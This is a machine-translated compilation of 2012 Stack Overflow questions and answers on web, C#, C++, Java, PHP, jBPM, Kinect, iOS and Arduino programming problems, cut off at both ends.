        var url = 'http://search.twitter.com/search.json?q=blue%20angels&rpp=5&include_entities=true&result_type=mixed&callback=?';
        var tweets = $('#twitter');
        $.getJSON(url,
            function(data){
              $.each(data.results, function(i,item){ 
                    // parse image url
                    var imgString = parseImg(item.profile_image_url, item.from_user);

                    var urlString = parseUrl(item.from_user, item.id);

                    var tweetString = parseTweet(item.text);

                    //tweets.append('<div>'+imgString+'<p>'+urlString+'</p>'+'<p>'+tweetString+'</p></div>');

                    var contentString = '<div>'+imgString+'<p>'+urlString+'</p>'+'<p>'+tweetString+'</p></div>';

                    console.log(item.location);

              });
            });
    }; 
```

返回的 JSON 样本

```
from_user: "Elvira_Sysyn",
from_user_id: 539551608,
from_user_id_str: "539551608",
from_user_name: "Elvira Sysyn",
geo: null,
location: "San Francisco, CA",
id: 258898154894786560,
id_str: "258898154894786560",
iso_language_code: "en",
metadata: {
result_type: "recent"
},
profile_image_url: "http://a0.twimg.com/profile_images/2519826073/kl_normal.jpg",
profile_image_url_https: "https://si0.twimg.com/profile_images/2519826073/kl_normal.jpg",
source: "&lt;a href=&quot;http://twitter.com/&quot;&gt;web&lt;/a&gt;",
text: "woww!! the big surprise, just 1 days your followers can reach 3000 up,  visit ---&gt; http://t.co/UqhRKnKr",
to_user: null,
to_user_id: 0,
to_user_id_str: "0",
to_user_name: null 
```

我真的必须完成这个，我会很感激任何帮助..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:56:59.307

我将您的确切代码放在小提琴中，并且返回的 JSON 中不存在位置，因此它是未定义的。

[小提琴](http://jsfiddle.net/f8DmJ/2/)

# html - 特定的 CSS 菜单布局

> ID：12954433
> 
> 赞同：0
> 
> 时间：2012-10-18T12:16:44.990
> 
> 标签：html, css, menu

我正在处理一些 Web 开发问题，想知道如何在 HTML、CSS、Javascript 中实现[这个特定的菜单布局。](http://www.michaelkeutel.de/Layout.png)当悬停在“设计”或“Hintergründe”上时，主要区域会发生变化并显示内容。我的问题是边框，当活动菜单点改变时，轮廓也会改变。因此，我会为“Design”和“Hintergründe”使用 2 个 div 容器，并在左侧、顶部和右侧（无底部）设置边框。主要区域必须是一个带有边框的 div。如何实现菜单选择和主要区域相互融合的边界缺失派对？

顺便说一句：那些服装（薄）滚动条在 div 容器的 HTML 中是否可行？

提前谢谢所有最好的迈克尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:18:41.980

The tab that you click on has the same background colour as the content area, and it has `margin-bottom:-1px` and a `z-index` to place it over the content. This makes the background cover up the content area's border, producing the effect you're looking for.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:25:58.860

MichiMichbeck 对标签给出了很好的答案。

对于细滚动条，请尝试许多可用的 javascript/jquery 插件之一。一个例子是：http: [//jscrollpane.kelvinluck.com/](http://jscrollpane.kelvinluck.com/)

您还可以在 CSS 中更改 webkit 浏览器的滚动条：http: [//css-tricks.com/custom-scrollbars-in-webkit/](http://css-tricks.com/custom-scrollbars-in-webkit/)。但可能首选 javasript 解决方案。

# image-processing - 图像中的自动植物群检测

> ID：12954438
> 
> 赞同：4
> 
> 时间：2012-10-18T12:17:09.800
> 
> 标签：image-processing, opencv, machine-learning, classification, feature-extraction

我的图像数据集来自[http://www.image-net.org](http://www.image-net.org)。对于不同的事物，如植物群、动物群、人等，有各种同义词集，
我必须训练一个分类器，如果图像属于花卉同义词集，则预测为 1，否则为 0。
属于花卉同义词集的图像可以在[http://www.image-net.org/explore](http://www.image-net.org/explore)上查看，通过单击左侧窗格中的植物、植物、植物生命选项。

这些图像包括各种各样的植物群——如树木、草本植物、灌木、花卉等。我无法弄清楚要使用哪些特征来训练分类器。这些图像中有很多绿色植物，但有很多花卉图像，没有太多绿色成分。另一个特点是叶子和花瓣的形状。

如果有人能建议如何提取这个形状特征并用它来训练分类器，那将会很有帮助。还建议可以使用哪些其他特征来训练分类器。
提取特征后，要使用哪种算法来训练分类器？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:52:53.833

不确定形状信息是您链接到的数据集的方法。

只是快速浏览了一些图像，我有一些分类建议：

1.  自然场景很少有直线——直线检测
2.  您可以忽略其中包含“不自然”颜色的场景。
3.  如果你想尝试更高级的东西，我建议熵/模式识别之间的混合会形成一个很好的分类器，因为自然场景两者都有。
4.  尝试对叶子/花瓣进行模板匹配/形状匹配会让你心碎——你需要使用更通用的东西。

至于使用哪个分类器......我通常会在最初建议 K-means，一旦你有一些结果，确定是否值得付出额外的努力来实现贝叶斯或神经网络。

希望这可以帮助。

T。

**扩展：**

“不自然的颜色”可能是绿色和棕色范围之外的高度饱和的颜色。它们非常适合检测自然场景，因为即使一朵花在它的中心，也应该有大约 50% 的场景处于绿色/棕色光谱中。

此外，直线检测应该在自然场景中产生很少的结果，因为直线边缘在自然界中很少见。在基本级别上生成边缘图像，对其设置阈值，然后搜索线段（近似直线的像素）。

熵需要一些机器视觉知识。您将通过确定局部熵来接近场景，然后在[此处](http://www.codeproject.com/Articles/15255/2D-and-3D-Image-histograms-and-2D-multistage-entro)对结果进行直方图处理，这是您必须使用的类似方法。

如果您要尝试模式识别，您会希望在机器视觉方面取得进步，因为这是一个困难的主题，而不是您可以在代码示例中抛出的东西。一旦颜色和边缘信息（线）用尽，我只会尝试将它们实现为分类器。

如果这是商业应用，则应咨询 MV 专家。如果这是大学作业（除非是论文），颜色和边缘/线条信息应该绰绰有余。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:45:50.317

[我认为， HOOG](http://en.wikipedia.org/wiki/Histogram_of_oriented_gradients)功能几乎是这类问题的事实上的标准。他们有点参与计算（我不知道你在什么环境中工作）但功能强大。

一个更简单的解决方案可能会让您启动并运行，具体取决于数据集的难易程度，是从图像中提取所有重叠的补丁，使用 k-means（或任何您喜欢的方法）对它们进行聚类，然后将图像表示为分布在这组量化图像块上，用于像 SVM 这样的监督分类器。你会惊讶于这样的事情有多频繁，它至少应该提供一个有竞争力的基线。

# c# - COM+、事务和 ContextUtil.SetAbort()

> ID：12954440
> 
> 赞同：2
> 
> 时间：2012-10-18T12:17:14.400
> 
> 标签：c#, com+

我得到了一个看起来像这样的服务组件（不是我写的）：

```
[Transaction(TransactionOption.Required, Isolation = TransactionIsolationLevel.Serializable, Timeout = 120), EventTrackingEnabled(true)]
public class SomeComponent : ServicedComponent
{
    public void DoSomething()
    {
        try
        {
            //some db operation
        }
        catch (Exception err)
        {
            ContextUtil.SetAbort();
            throw;
        }
} 
```

真的`ContextUtil.SetAbort()`需要吗？当组件离开时，异常不会中止事务吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:24:19.717

仅当您想手动管理事务时。

`[AutoComplete]`如果您以这种方式使用属性装饰您的操作，您的组件将自动投票中止（以防引发任何异常）或提交：

```
[AutoComplete]
public void DoSomething() 
```

**编辑：**

有关此属性的详细信息，请参阅[此处的 MSDN](http://msdn.microsoft.com/en-us/library/system.enterpriseservices.autocompleteattribute%28v=vs.80%29.aspx)：

> 如果方法调用正常返回，事务会自动调用 SetComplete。如果方法调用抛出异常，则事务被中止。

无论如何，如果您（在极少数情况下）确实需要手动管理交易，那么不要让您的交易受到质疑，这一点非常重要。我在您的代码中缺少`ContextUtil.SetComplete();`应该显式调用的代码。

# tridion - 在 RTF 字段中添加自闭合标签

> ID：12954444
> 
> 赞同：5
> 
> 时间：2012-10-18T12:17:42.853
> 
> 标签：tridion, tridion-2011

我们从 Tridion 5.3 升级到了 Tridion 2011 SP1。

在我们现有的内容中，我们在 RTF 领域的很多地方都使用了 html 元素，例如`<a name="top" id="top"></a>`. 当我们从 tridion 锚`<a>`标签发布组件/页面时，标签将被转换为自闭合锚标签`<a name="top" id="top" />`。由于这个超链接是在 RTF 字段的整个内容上形成的，因为浏览器将此标签视为 anchor 的开始标签`<a>`。当我们在 FireFox 中检查页面源代码时，它会显示在非空 HTML 元素上使用的“自关闭语法 ("/>")”。忽略斜线并将其视​​为开始标记。为了解决这个问题，我们将现有内容更新`<a name="top" id="top">&nbsp;</a>`为工作正常，但不是一个好的解决方案。任何其他想法/配置，以便它不会被转换为自闭合标签。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T13:46:16.027

[**我在这里**](https://stackoverflow.com/questions/10537656/creating-anchor-links-in-rich-text-fields-with-sdl-tridion-2011-sp1)有一个类似的问题[](https://stackoverflow.com/questions/10537656/creating-anchor-links-in-rich-text-fields-with-sdl-tridion-2011-sp1)

 **我已经在那里发布了我的工作。希望能帮助到你。

我不确定您使用的是哪种模板，但通常我会发布处理我的输出并使用 XSLT 和 XSLT 中介器查找任何空标签。当我发现空标签时，我倾向于将它们转换为包含空文本，以防止浏览器查看最终内容时出现任何问题。

```
<div></div> or <div/> 
```

将转换为

```
<div> </div> 
```

虽然第一个示例在技术上是有效的 XML，但它们确实（正如您所发现的）破坏了几个浏览器。**

# c# - How to make SkeletonFrames avaible in my click event?

> ID：12954445
> 
> 赞同：0
> 
> 时间：2012-10-18T12:17:42.123
> 
> 标签：c#, image-processing, kinect, motion-detection

I want my SkeletonFrames avaible in my click event. Is there anyway to make it possible?

I was planning to create a Kinect to place image on skeleton joints. Here's my coding.

```
private void button1_Click(object sender, RoutedEventArgs e)
{
    foreach (SkeletonData data in e.SkeletonFrame.Skeletons)
    {
        foreach (Joint joint in data.Joints)
        {
            if (joint.Position.W < 0.6f) return;
            switch (joint.ID)
            {
                case JointID.Head:
                    var heanp = getDisplayPosition(joint);

                    Canvas.SetLeft(imgHead, heanp.X);
                    Canvas.SetTop(imgHead, heanp.Y);
                    break;
            }
        }
    }
} 
```

If there's any mistakes, please do correct me.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T17:43:51.307

您可以捕获 SkeletonFrameReady 事件并将最后捕获的骨架保存到全局变量中，您可以从按钮单击事件中访问该变量。

例如：

```
private Skeleton[] skeletons = new Skeleton[0];

private void SensorSkeletonFrameReady(object sender, SkeletonFrameReadyEventArgs e)
{
    Skeleton[] skeletons = new Skeleton[0];

    using (SkeletonFrame skeletonFrame = e.OpenSkeletonFrame())
    {
        if (skeletonFrame != null)
        {
            skeletons = new Skeleton[skeletonFrame.SkeletonArrayLength];
            skeletonFrame.CopySkeletonDataTo(skeletons);
        }
    }
} 
```

现在您有了最后一个 SkeletonFrameReady 事件的数组（*骨架*）。

根据下面的评论，您需要升级到 SDK 的 v1.6 并查看 Microsoft 提供的示例。尽管他们可能不会完全按照您的当前项目所需做，但他们会教您使用 Microsoft Kinect for Windows 的**基本基础知识**，并让您了解如何使用传感器。

对于您的当前情况，您最想查看的示例是*SkeletonBasics-WPF*示例。这将向您展示如何跟踪骨架并从中提取数据。它还向您展示了如何在跟踪点上以及在跟踪点之间绘制项目。

对于您的情况，最相关的部分是*DrawBonesAndJoints*函数：

```
private void DrawBonesAndJoints(Skeleton skeleton, DrawingContext drawingContext)
{
    // Render Torso
    this.DrawBone(skeleton, drawingContext, JointType.Head, JointType.ShoulderCenter);
    this.DrawBone(skeleton, drawingContext, JointType.ShoulderCenter, JointType.ShoulderLeft);
    this.DrawBone(skeleton, drawingContext, JointType.ShoulderCenter, JointType.ShoulderRight);
    this.DrawBone(skeleton, drawingContext, JointType.ShoulderCenter, JointType.Spine);
    this.DrawBone(skeleton, drawingContext, JointType.Spine, JointType.HipCenter);
    this.DrawBone(skeleton, drawingContext, JointType.HipCenter, JointType.HipLeft);
    this.DrawBone(skeleton, drawingContext, JointType.HipCenter, JointType.HipRight);

    // Left Arm
    this.DrawBone(skeleton, drawingContext, JointType.ShoulderLeft, JointType.ElbowLeft);
    this.DrawBone(skeleton, drawingContext, JointType.ElbowLeft, JointType.WristLeft);
    this.DrawBone(skeleton, drawingContext, JointType.WristLeft, JointType.HandLeft);

    // Right Arm
    this.DrawBone(skeleton, drawingContext, JointType.ShoulderRight, JointType.ElbowRight);
    this.DrawBone(skeleton, drawingContext, JointType.ElbowRight, JointType.WristRight);
    this.DrawBone(skeleton, drawingContext, JointType.WristRight, JointType.HandRight);

    // Left Leg
    this.DrawBone(skeleton, drawingContext, JointType.HipLeft, JointType.KneeLeft);
    this.DrawBone(skeleton, drawingContext, JointType.KneeLeft, JointType.AnkleLeft);
    this.DrawBone(skeleton, drawingContext, JointType.AnkleLeft, JointType.FootLeft);

    // Right Leg
    this.DrawBone(skeleton, drawingContext, JointType.HipRight, JointType.KneeRight);
    this.DrawBone(skeleton, drawingContext, JointType.KneeRight, JointType.AnkleRight);
    this.DrawBone(skeleton, drawingContext, JointType.AnkleRight, JointType.FootRight);

    // Render Joints
    foreach (Joint joint in skeleton.Joints)
    {
        Brush drawBrush = null;

        if (joint.TrackingState == JointTrackingState.Tracked)
        {
            drawBrush = this.trackedJointBrush;                    
        }
        else if (joint.TrackingState == JointTrackingState.Inferred)
        {
            drawBrush = this.inferredJointBrush;                    
        }

        if (drawBrush != null)
        {
            drawingContext.DrawEllipse(drawBrush, null, this.SkeletonPointToScreen(joint.Position), JointThickness, JointThickness);
        }
    }
} 
```

因为您不关心骨骼，所以可以删除绘制它们的函数调用：

```
private void DrawBonesAndJoints(Skeleton skeleton, DrawingContext drawingContext)
{
    // Render Joints
    foreach (Joint joint in skeleton.Joints)
    {
        Brush drawBrush = null;

        if (joint.TrackingState == JointTrackingState.Tracked)
        {
            drawBrush = this.trackedJointBrush;                    
        }
        else if (joint.TrackingState == JointTrackingState.Inferred)
        {
            drawBrush = this.inferredJointBrush;                    
        }

        if (drawBrush != null)
        {
            drawingContext.DrawEllipse(drawBrush, null, this.SkeletonPointToScreen(joint.Position), JointThickness, JointThickness);
        }
    }
} 
```

现在你有一个程序可以在所有关节上画点。如果你想要的只是双手...

```
private void DrawBonesAndJoints(Skeleton skeleton, DrawingContext drawingContext)
{
    drawingContext.DrawEllipse(trackedJointBrush, null, SkeletonPointToScreen(skeleton.Joints[JointType.HandLeft].Position), JointThickness, JointThickness);
    drawingContext.DrawEllipse(trackedJointBrush, null, SkeletonPointToScreen(skeleton.Joints[JointType.HandRight].Position), JointThickness, JointThickness);
} 
```

现在你的手周围会有两个小点。

# objective-c - iTunes Connect 崩溃报告 - UINibDecoderDecodeObjectForValue

> ID：12954453
> 
> 赞同：0
> 
> 时间：2012-10-18T12:18:10.140
> 
> 标签：objective-c, ios, crash, crash-reports

我有一份关于 iOS 5.1 的崩溃报告，它是由`UINibDecoderDecodeObjectForValue`. 据我了解，这通常是由于笔尖中的值设置不正确（通常某些内容已被删除）。崩溃报告给了我两个问题：

1.  从崩溃报告本身我看不出是哪个笔尖导致了崩溃。但是，我有一些评论指出崩溃发生在某些用户的设置屏幕上，所以这是我关注的一个。

2.  假设它是设置视图，它只是一个带有表格视图的 UIViewController。它有 UITableViewDelegate 和 UITableViewDataSource。据我所知，一切都设置正确。

所以我的问题是：

如何确认是什么笔尖导致错误？无论如何，我可以让 XCode 就我的笔尖可能出现的任何问题向我发出警告吗？

来自崩溃报告的 Stacktrace 在[这里](http://pastebin.com/bm63xpNQ)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T15:49:04.317

1.  如果你发布你得到的异常，那真的很有帮助。
2.  检查 IBOutlets，可能缺少某些内容或设置错误（IB 不知道它与 XCode 的最佳集成）
3.  检查您的 nib 中是否有弃用的 UI 元素（同样，IB 不知道它与目标 SDK 的兼容性）。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T17:26:36.917

问题出在 iOS 自动布局上。与此处发现的问题类似：

[presentViewController: 在 iOS <6 (AutoLayout) 上崩溃](https://stackoverflow.com/questions/11198981/presentviewcontroller-crash-on-ios-6-autolayout)

# jbpm - How does the evaluation process example of jBPM works?

> ID：12954458
> 
> 赞同：0
> 
> 时间：2012-10-18T12:18:20.930
> 
> 标签：jbpm

I tried the evaluation process of jBPM suite, and this is just what I need, but course to apply in a project that I want to start.

I have readed the jBPM documentation and I executed successfuly the evaluation example that comes with the jbpm-installer full version (of jbpm 5.3.0), but it is not clear for me the next points. I will try to describe in this example. Let's say I have to create a litle web sistem from scratch, users of this web system will login and they will start processes instances and can check if they have tasks assigned (yes,just like the evaluation example, but of course, they do not use the jbpm-console to see that information, The system must have its very own presentation on web ) and also they can perform those task, so the process can continue.

So I create a process definition with drools-guvnor tool, I compiled the process, now it appears in jbpm-console overs processes definitions,I even can start this process in the console (please, letme know if I'm those are not the right steps to create a process), at this point:

-How do I create/generate the forms to allow users to complete the tasks?. Just like evaluation process does.

-Is it possible to use that forms outside the jbpm-console?, so I can put them into my web system and the users use them.

-Could I use the server:8080/gwt-console-server REST API to start processes, get processes information and manage them instead of programaticaly?or I will always need to (for example) start my processes by using the `ksession.startProcess("com.myprocess");`

and finally, as I'm not to much involved with java technologies to create web pages, applications. -In order to create a WEB system that uses jBPM to manage the bussiness logic, shows its own presentation on web to users, let them perform human tasks (fill forms, start processes) and store the data, what achitechture do you recommend?

Thanks very much in advanced

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-19T10:37:48.947

> -如何创建/生成表单以允许用户完成任务？就像评估过程一样。

表单是简单的 html 模板。您可以： - 使用工具为您生成表单： [http://docs.jboss.org/jbpm/v5.3/userguide/ch.designer.html#d0e4369](http://docs.jboss.org/jbpm/v5.3/userguide/ch.designer.html#d0e4369) http://kverlaen.blogspot.it/2012 /03/reward-system-demo.html - 在网页设计器中自己创建表单（选择任务并单击人工任务图标以编辑 html）

> - 是否可以在 jbpm-console 之外使用该表单？所以我可以将它们放入我的 Web 系统并供用户使用。

是的，您可以使用 jBPM REST API 在某个框架中显示表单。

> - 我可以使用 server:8080/gwt-console-server REST API 来启动进程、获取进程信息并管理它们而不是编程吗？或者我总是需要（例如）使用 ksession.startProcess( “com.myprocess”）；

当然，如果 REST API 提供了您需要的所有功能，您可以使用它来启动流程、获取任务列表等。您还可以实例化嵌入到应用程序中的会话，但这不是必需的。

# c++ - 在 C++ 中解析缓冲区数据

> ID：12954463
> 
> 赞同：2
> 
> 时间：2012-10-18T12:18:51.853
> 
> 标签：c++, parsing, buffer

我的 C++ 项目有一个缓冲区，它可以是任意大小并由蓝牙填充。传入消息的格式类似于 0x43 0x0B 0x00 0x06 0xA2 0x03 0x03 0x00 0x01 0x01 0x0A 0x0B 0x0B 0xE6 0x0D 其中以 0x43 开头并以 0x0D 结尾。因此，这意味着每次缓冲区被填满时，根据上述消息格式，它可以有不同的内容顺序。

```
static const int BufferSize = 1024;
byte buffer[BufferSize]; 
```

1.  解析此缓冲区中传入消息的最佳方法是什么？
2.  由于我来自 Java 和 .NET，将每个提取的消息作为对象的最佳方法是什么？类可能是解决方案？
3.  我已经创建了一个单独的类来解析缓冲区，如下所示，我的方向是否正确？

* * *

```
#include<parsingClass.h>
class A
{
   parsingClass ps;
public:
   parsingClass.parse(buffer, BufferSize);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:57:52.347

您可以将解析器作为“ProtocolUnit”类的方法吗？该方法可以将缓冲区指针/长度作为参数，并返回一个 int 值，指示它在正确组装完整协议单元之前从缓冲区消耗了多少字节，或者如果它需要来自下一个缓冲区的更多字节，则返回 -1。

一旦你有了一个完整的 ProtocolUnit，你可以用它做你想做的事，（例如，将它排到某个处理线程），并为剩余的字节/下一个缓冲区创建一个新的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:29:29.433

```
class ReturnMessage{
    char *message; 
    public:
    char *getMessage(unsigned char *buffer,int count){
         message = new char[count];
         for(int i = 1; i < count-2; i++){
            message[i-1] = buffer[i];
         }
         message[count-2] = '\0';
         return message;
    }
};
class ParserToMessage{
static int BufferSize = 1024;
unsigned char buffer[BufferSize];
unsigned int counter;
public:
  static char *parse_buffer()
  {
     ReturnMessage rm;
     unsigned char buffByte;
     buffByte = blueToothGetByte(); //fictional getchar() kind of function for bluetooth
     if(buffByte == 0x43){
        buffer[counter++] = buffByte;
        //continue until you find 0x0D
        while((buffByte = blueToothGetByte()) != 0x0D){
            buffer[counter++] = buffByte;
        }
     }
     return rm.getMessage(buffer,counter);
   }
}; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T13:15:43.283

“我应该如何解析这个”的问题很大程度上取决于您想要如何解析数据*。*您的问题缺少两件事：

1.  您究竟是如何接收数据的？你提到蓝牙，但什么是编程媒介？你是从套接字读取的吗？你有其他类型的API吗？您是一次接收一个字节还是分块接收它？
2.  处理您收到的数据的规则是什么？大多数数据以某种方式或固定字段长度分隔。在您的情况下，您提到它可以是任意长度，但除非您解释要*如何*解析它，否则我无能为力。

我会提出的一个建议是更改要使用的缓冲区类型`std::vector`：

```
std::vector<unsigned char> buffer(normalSize) 
```

您应该选择`normalSize`在收到消息的最常观察到的大小附近。向量会随着您将项目推送到其上而增长，因此，与您创建的数组不同，如果您收到一条大消息，您无需担心缓冲区溢出。但是，如果您确实超出`normalSize`了封面，则向量将重新分配足够的内存来应对您的扩展需求。这可能很昂贵，因此您不想经常这样做。

您使用向量的方式与数组的使用方式几乎相同。一个关键的区别是您可以简单地将元素推到向量的末尾，而不必保留一个正在运行的指针。所以想象你一次从蓝牙源收到一个 int，你的代码可能看起来像这样：

```
// Clear out the previous contents of the buffer.
buffer.clear();

int elem(0);
// Find the start of your message. Throw away elements
// that we don't need.
while ( 0x43 != ( elem = getNextBluetoothInt() ) );

// Push elements of the message into the buffer until
// we hit the end.
while ( 0x0D != elem )
{
    buffer.push_back( elem );
}
buffer.push_back( elem ); // Remember to add on the last one. 
```

关键的好处是，无论推送的字符数是 10 还是 10,000，数组都会自动调整向量的大小，而无需您这样做。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:53:22.210

> 我的 C++ 项目有一个可以是任意大小的缓冲区

我注意到的第一件事是您对缓冲区大小进行了硬编码。如果尝试将大于您指定大小的数据读取到缓冲区中，您将面临缓冲区溢出的危险。

如果可能，请保持缓冲区大小动态，并根据要接收到缓冲区中的数据大小创建字节数组。在创建字节数组之前，尝试通知对象传入缓冲区大小的字节数组所在的位置。

```
int nBufferSize = GetBufferSize();
UCHAR* szByteArray = new UCHAR[nBufferSize]; 
```

> 解析此缓冲区中传入消息的最佳方法是什么？

您在正确的路线上，因为您已经创建并正在使用解析器类。我建议使用[memcpy](http://msdn.microsoft.com/en-us/library/dswaw1wk%28v=vs.100%29.aspx)一次将单个数据项从缓冲区复制到您选择的变量。在这一点上不知道你意图的更广泛背景，我不能补充太多。

> 由于我来自 Java 和 .NET，将每个提取的消息作为对象的最佳方法是什么？类可能是解决方案？

根据您从缓冲区读取的数据的复杂性以及您的计划，您可以使用类或结构。如果您不需要使用此数据创建为其他对象提供服务的对象，则可以使用结构。当您的需求不那么复杂时，结构体非常棒，因此一个完整的类可能是矫枉过正的。

> 我已经创建了一个单独的类来解析缓冲区，如下所示，我的方向是否正确？

我认同。

我希望这对初学者有帮助！

# php - 阵列上的级联内爆

> ID：12954489
> 
> 赞同：0
> 
> 时间：2012-10-18T12:20:18.437
> 
> 标签：php, multidimensional-array, concatenation, implode

我正在遍历一组数据并提取以下结果：

```
$str[] = $id . '~' . $desc; 
```

在循环结束时，我将这些放在一起：

```
$txt_str = implode('^',$str);

echo $txt_str;

1~one^2~two^3~three 
```

出于好奇，我可以通过直接处理数组来获得相同的结果吗？

```
$arr[] = array('id'=$id, 'desc'=>$desc); 
```

所以像：

```
$txt_str = makemeasammich('~', '^', $arr);

echo $txt_str;

1~one^2~two^3~three 
```

是否有具有此功能的本机 PHP 函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:42:20.043

**没有这样的原生 PHP 函数。**
使用`implode()`and `array_map()`（带有匿名函数）：

```
implode('^', array_map(function($value) {
    return implode('~', $value);
}, $myArray)); 
```

# javascript - 在 IE7 中首次加载时，jQuery-ui Accordion 左边距不正确？

> ID：12954493
> 
> 赞同：0
> 
> 时间：2012-10-18T12:20:26.453
> 
> 标签：javascript, asp.net, jquery-ui, internet-explorer-7, jquery-ui-accordion

我正在使用需要进入嵌入式 IE7 浏览器的 jQueryUI 手风琴，该浏览器是第 3 方软件的一部分。

我的问题是左边距在初始加载时没有正确排列。当我将鼠标悬停在折叠的项目上或单击展开的项目时，边距会自行修复，但这会导致在使用控件时发生一些奇怪的移动。

以下是一些显示问题的图像：

![在此处输入图像描述](../Images/b4419668c5296bea0f5da070973c9c8e.png)

调用`$(".jqueryui-accordion").accordion("resize");`会在首次加载时更正展开项目的边距，但不会更正折叠项目的边距。最小化应用程序和最大化窗口也将导致项目正确地重绘自己。

我该怎么做才能在 IE7 中首次加载时正确呈现边距？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-23T13:37:13.693

尝试添加以下css样式：

```
div, span {
    zoom: 1;
} 
```

这有时有助于解决 IE7 中的此类布局问题。

# java - 正则表达式解析可能由或不由 ; 分隔的字符串 分成几组

> ID：12954494
> 
> 赞同：3
> 
> 时间：2012-10-18T12:20:26.937
> 
> 标签：java, regex, string, regex-group

我有一个案例，我需要根据一个标准将一个字符串解析为几个组

例如下面的；

```
01%3A%35r%07%01P%88%00;WAP_GPRS 
```

应该是2组

```
%3A%35r%07%01P%88%00
WAP_GPRS 
```

请注意，我不关心开头的 01，并且可以有 0 个或多个由 ; 分隔的子字符串。我需要他们都在他们自己的小组中。

另一个;

```
01%3A%35r%07%01P%88%00;KPN;A23B 
```

应该是3组：

```
%3A%35r%07%01P%88%00
KPN
A23B 
```

基本上，我不需要关心字母或数字是第一位的。问题是将表达式分组为自己的，可以是 0 次或更多次。意思如下

```
01%3A%35r%07%01P%88%00 
```

还应该产生一组`%3A%35r%07%01P%88%00`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:23:01.387

为什么不只是`split`你的字符串`;`。

但在此之前，您需要`01`在第一个之前删除它`%`，使用`String#substring`，因为您没有在`required`输出中显示：-

```
 String str = "01%3A%35r%07%01P%88%00;WAP_GPRS";

  // Remove `01` before first `%`
  str = str.replace(str.substring(0, str.indexOf("%")), "");  

  String[] groups = str.split(";");
  System.out.println(Arrays.toString(groups)); 
```

**输出**： -

```
[%3A%35r%07%01P%88%00, WAP_GPRS] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:30:09.667

您不需要正则表达式：

```
String data = "01%3A%35r%07%01P%88%00;KPN;A23B"

String groups = s.split(";")

for (String s: groups ){
     System.out.println(s); // I'm printing each separate group
} 
```

删除原始字符串的前两个字母是另一件与组分离无关的事情，您可以使用 substring 方法来完成。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:54:31.317

所以我想你需要一个拆分的正则表达式模拟。这将需要一个重复的捕获组。

坏消息，有些人研究了类似的问题并没有找到正确的答案： [https ://stackoverflow.com/a/6836024/1665128](https://stackoverflow.com/a/6836024/1665128)

好消息，如果您可以对组的数量进行合理的限制，并且可以添加一些代码来识别空的尾随，这可能会有所帮助：

```
([^;]*);?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)?;?([^;]*)? 
```

# arduino - 使用模拟读取测量来自数字引脚的电流

> ID：12954497
> 
> 赞同：2
> 
> 时间：2012-10-18T12:20:36.033
> 
> 标签：arduino

我希望能够检查是否放置了一些拼图。为了尽可能简单地做到这一点，我设置了 5 个数字引脚以输出高电平`digitalWrite()`。来自数字引脚的电线分别连接到一个模拟引脚。我没有封闭电路，而是为每一块用铝箔覆盖的拼图设置了一个间隙。

逻辑是，当拼图块放置好后，电路就完成了——Arduino 会给出某种输出。由于我有很多碎片，我需要一些逻辑来测试是否放置了每个特定的碎片。

我试图从`digitalWrite()`with读取输出`analogRead()`并将 0-1023 的值映射到 0-100 的范围内。这给了我一个很大的读数变化，有时读数为 100 (1023)，即使电路没有被拼图闭合。

是否有可能获得一个变化不大的更精确的读数？到目前为止，我还没有在不同引脚之间使用任何电阻。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:20:14.640

为什么要连接到模拟引脚？

一路数字化。将数字引脚连接到另一个数字引脚，启用上拉电阻，然后`digitalRead`在该引脚上执行操作。

如果它打开，你应该得到 1，如果它关闭，你应该得到 0。

很简单，不是吗？

我希望我有所帮助。

# c# - 如何打开 Internet Explorer 窗口，在 url 上导航并使用 c# 和 mshtml 库获取她的文档（HTMLDocument 或 InternetExplorer）

> ID：12954501
> 
> 赞同：2
> 
> 时间：2012-10-18T12:20:35.883
> 
> 标签：c#, internet-explorer, mshtml

如何使用 c# 和 mshtml 库打开 Internet Explorer 窗口或选项卡、导航并获取她的文档（HTMLDocument 或 InternetExplorer）。IE 对象的类型应该是 HTMLDocument 或 InternetExplorer。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-18T12:55:37.813

如果您想要 IE 的交互式自动化实例，请添加对*Microsoft Internet Controls*的 (COM) 引用；

```
private void Form1_Load(object sender, EventArgs e) {
    var IE = new SHDocVw.InternetExplorer();
    IE.NavigateComplete2 += new SHDocVw.DWebBrowserEvents2_NavigateComplete2EventHandler(OnNavigateComplete2);
    object URL = "http://www.stackoverflow.com";
    IE.Visible = true;
    IE.Navigate2(ref URL);
}
public void OnNavigateComplete2(object pDisp, ref object url) {
    var IE = (SHDocVw.InternetExplorer)pDisp;
    MessageBox.Show(IE.Document.Title);
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-01-24T07:49:56.480

```
InternetExplorer ie= new InternetExplorer();
ie.Navigate("www.example.com");
ie.Visible = true;
Thread.Sleep(5000);//wait until page loads
mshtml.HTMLDocument doc;
